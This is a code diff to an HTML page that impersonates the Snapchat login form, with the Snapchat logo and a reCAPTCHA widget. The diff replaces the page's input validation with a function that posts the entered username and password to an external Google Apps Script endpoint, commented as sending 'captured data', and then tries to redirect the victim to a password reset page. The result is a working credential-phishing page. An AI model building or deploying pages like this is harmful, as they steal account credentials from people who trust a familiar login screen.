@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <title>Snapchat Login</title>
     <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         .error-message {
             color: red;
@@ -12,12 +11,14 @@
             font-size: 14px;
         }
     </style>
+    <!-- Google reCAPTCHA -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
     <div class="form">
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
         <h1>Snapchat Login</h1>
-        <form id="loginForm">
+        <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec" method="post">
             <label for="username">Username or Email Address:</label><br>
             <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
             <span id="usernameError" class="error-message"></span><br>
@@ -26,6 +27,7 @@
             <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
             <span id="passwordError" class="error-message"></span><br>
             
+            <!-- Google reCAPTCHA -->
             <div class="g-recaptcha" data-sitekey="6LdyV_wpAAAAAO7dKxETuuFMa5ROZyZnfJ0O_DLG"></div>
             <span id="captchaError" class="error-message"></span><br>
             
@@ -42,50 +44,42 @@
             var password = document.getElementById('password').value;
             var recaptchaResponse = grecaptcha.getResponse();
             
-            if (validateForm(username, password, recaptchaResponse)) {
-                // Optional: Verify recaptchaResponse with your server-side logic
-                // For educational purposes, the client-side check is shown here.
-                if (recaptchaResponse.length === 0) {
-                    document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
-                    return;
-                }
-                
-                // Log the username and password (for demonstration purposes only)
-                console.log('Logging in:', username, password);
-                
-                // Redirect to password reset page (for demonstration purposes only)
-                window.location.href = "password_reset.html";
+            // Validate reCAPTCHA
+            if (!recaptchaResponse) {
+                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
+                return;
             }
+            
+            // Send captured data to server (Google Apps Script endpoint)
+            logLogin(username, password);
         });
         
-        function validateForm(username, password, recaptchaResponse) {
-            var isValid = true;
+        function logLogin(username, password) {
+            var url = "https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec"; // Update with your deployed Google Apps Script URL
             
-            // Reset error messages
-            document.getElementById('usernameError').textContent = '';
-            document.getElementById('passwordError').textContent = '';
-            document.getElementById('loginError').textContent = '';
-            document.getElementById('captchaError').textContent = '';
+            var formData = new FormData();
+            formData.append("username", username);
+            formData.append("password", password);
             
-            // Validate username
-            if (!username.trim()) {
-                document.getElementById('usernameError').textContent = 'Username or email is required';
-                isValid = false;
-            }
-            
-            // Validate password
-            if (!password.trim()) {
-                document.getElementById('passwordError').textContent = 'Password is required';
-                isValid = false;
-            }
-            
-            // Validate reCAPTCHA
-            if (recaptchaResponse.length === 0) {
-                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
-                isValid = false;
-            }
-            
-            return isValid;
+            // Send data using fetch API
+            fetch(url, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // No-cors mode because of cross-origin issues
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Login succesful");
+                    window.location.href = "password_reset.html"; // Redirect to password reset page
+                } else {
+                    console.error("Error submitting login data");
+                    // Handle error (optional)
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Handle network error (optional)
+            });
         }
     </script>
 </body>
